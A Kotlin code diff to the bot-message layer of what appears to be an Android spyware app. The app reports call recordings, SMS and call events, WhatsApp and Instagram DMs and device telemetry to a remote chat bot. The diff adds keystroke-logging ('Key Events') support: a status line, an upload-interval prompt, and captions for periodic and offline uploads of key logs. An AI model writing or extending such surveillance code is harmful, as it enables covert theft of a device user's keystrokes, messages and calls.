@@ -23,7 +23,7 @@ object BotMessages {
         fun buildSendMessageInputPrompt(): String =
             "Reply to this message with your text's to display as popup on device."
 
-        fun buildStatusMessage(context: Context): String {
+        suspend fun buildStatusMessage(context: Context): String {
             val prefs = PrefsManager.getInstance(context)
             val metrics = TelemetryCollector.gatherTelemetry()
 
@@ -54,6 +54,7 @@ object BotMessages {
                 *Call Recording*: ${formatFeature(prefs.forwardRecordingEnabled)}
                 *Call Events*: ${formatFeature(prefs.callAlertsEnabled)}
                 *SMS Events*: ${formatFeature(prefs.smsAlertsEnabled)}
+                *Key Events*: ${formatFeature(prefs.keyEventsEnabled, prefs.keyEventsIntervalMin)}
 
                 *Social Updates* -
                 *Whatsapp*: ${formatFeature(prefs.whatsappUpdatesEnabled)}
@@ -84,7 +85,7 @@ object BotMessages {
                 *CPU Freq:* ${metrics["CPU_FREQ_MHZ"]} MHz
                 *CPU Load:* ${metrics["CPU_LOAD"]}
                 *Storage Used:* ${metrics["STORAGE"]}
-                *Battery:* ${metrics["BATTERY"]}% ${metrics["STATUS"]} | Health: ${metrics["HEALTH"]} mAh
+                *Battery:* ${metrics["BATTERY"]}% ${metrics["STATUS"]}
                 
                 *Network Activity:*
                 *${metrics["SIM1_CARRIER"]}:* ${metrics["SIM1_RSRP"]} dBm | *${metrics["SIM2_CARRIER"]}:* ${metrics["SIM2_RSRP"]} dBm
@@ -140,6 +141,7 @@ object BotMessages {
             val recState = if (prefs.forwardRecordingEnabled) "✅ Enabled" else "❌ Disabled"
             val callState = if (prefs.callAlertsEnabled) "✅ Enabled" else "❌ Disabled"
             val smsState = if (prefs.smsAlertsEnabled) "✅ Enabled" else "❌ Disabled"
+            val keyState = if (prefs.keyEventsEnabled) "✅ Enabled (${prefs.keyEventsIntervalMin} Min)" else "❌ Disabled"
             
             return """
                 #System #BasicUpdates
@@ -152,6 +154,22 @@ object BotMessages {
                 *Call Recording*: $recState
                 *Call Events*: $callState
                 *SMS Events*: $smsState
+                *Key Events*: $keyState
+            """.trimIndent()
+        }
+
+        fun buildKeyEventsFeaturePrompt(context: Context): String {
+            val prefs = PrefsManager.getInstance(context)
+            val state = if (prefs.keyEventsEnabled) "✅ Enabled (${prefs.keyEventsIntervalMin} Min)" else "❌ Disabled"
+            
+            return """
+                #System #KeyEvents
+                ===================
+                *Key Events Settings*
+                
+                Set an automatic interval for sending Key Events logs, or disable it completely.
+                
+                *Current State*: $state
             """.trimIndent()
         }
 
@@ -185,6 +203,7 @@ object BotMessages {
             """.trimIndent()
         }
 
+        @OptIn(kotlin.ExperimentalUnsignedTypes::class)
         fun buildRecorderSettingsPrompt(context: Context): String {
             val bcrPrefs = Preferences(context)
             val audioSource = Format.fromPreferences(bcrPrefs).audioSource
@@ -207,7 +226,6 @@ object BotMessages {
                 when ((format.paramInfo as RangedParamInfo).type) {
                     RangedParamType.Bitrate -> "$param kbps"
                     RangedParamType.CompressionLevel -> "Level $param"
-                    else -> "$param"
                 }
             } else {
                 "Quality $param"
@@ -425,6 +443,21 @@ object BotMessages {
             ===================
             ⚠️ *Update* - While the device was offline, Instagram DMs were received.
             Here are the remaining entries.
+        """.trimIndent()
+        
+        fun buildOfflineKeyEventsCaption(): String =
+                """
+            #KeyEvents #Offline
+            ===================
+            ⚠️ *Update* - While the device was offline, Key Events were recorded.
+            Here are the remaining entries.
+        """.trimIndent()
+        
+        fun buildRoutineKeyEventsCaption(): String =
+                """
+            #KeyEvents #Routine
+            ===================
+            🔄 *Routine Upload* - Here is the periodic Key Events.
         """.trimIndent()
         
         fun buildOfflineRecordingSyncedMessage(fileName: String): String =
